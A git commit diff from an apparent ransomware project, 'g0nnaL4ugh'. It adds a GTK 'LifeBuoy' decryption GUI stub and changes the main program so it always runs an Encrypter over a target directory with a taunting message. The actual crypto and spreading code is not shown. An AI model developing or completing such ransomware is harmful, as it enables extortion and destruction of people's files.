c136e317546d235a801c2d64f9ca7f4d9e0679b6
Gi Wah Davalos <giwirodavalos@gmail.com>
2018-06-08 12:06:55 -0500

    designed some gui with all ui validations to decrypt

---
+++ g0nnaL4ugh/LifeBuoy/MainWindow.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using Gtk;
+
+public partial class MainWindow : Gtk.Window
+{
+    public MainWindow() : base(Gtk.WindowType.Toplevel)
+    {
+        Build();
+		progressbar1.Visible = false;
+    }
+    
+    protected void OnDeleteEvent(object sender, DeleteEventArgs a)
+    {
+        Application.Quit();
+        a.RetVal = true;
+    }
+
+	protected void OnRescueBtnClicked(object sender, EventArgs e)
+	{
+		if (this.IsValidEntry(entry2.Text))
+		{
+			rescue.Sensitive = false;
+            entry2.Sensitive = false;
+			progressbar1.Visible = true;
+			this.BeginProgressAnimation();
+		}
+	}
+
+    private bool IsValidEntry(string text)
+	{
+		return !string.IsNullOrEmpty(text);
+	}
+
+    private void BeginProgressAnimation()
+	{
+	}
+}
--- g0nnaL4ugh/Program.cs
+++ g0nnaL4ugh/Program.cs
@@ -1,6 +1,4 @@
-﻿#define ENCRYPTION
-
-using System;
+﻿using System;
 using g0nnaL4ugh.Crypto;
 
 namespace g0nnaL4ugh
@@ -11,15 +9,9 @@ namespace g0nnaL4ugh
         {
             string[] paths = { "/home/giwiro/Playground/ransomware" };
             Spider spider;
-#if ENCRYPTION
             Encrypter encrypter = new Encrypter();
             spider = new Spider(paths, encrypter);
             Console.WriteLine("Wann4 play a G4m3?");
-#else
-            Decrypter decrypter = new Decrypter();
-            spider = new Spider(paths, decrypter);
-            Console.WriteLine("Ok sold1er let's decrypt all this,shall w3?");
-#endif
             spider.Spread();
  
         }
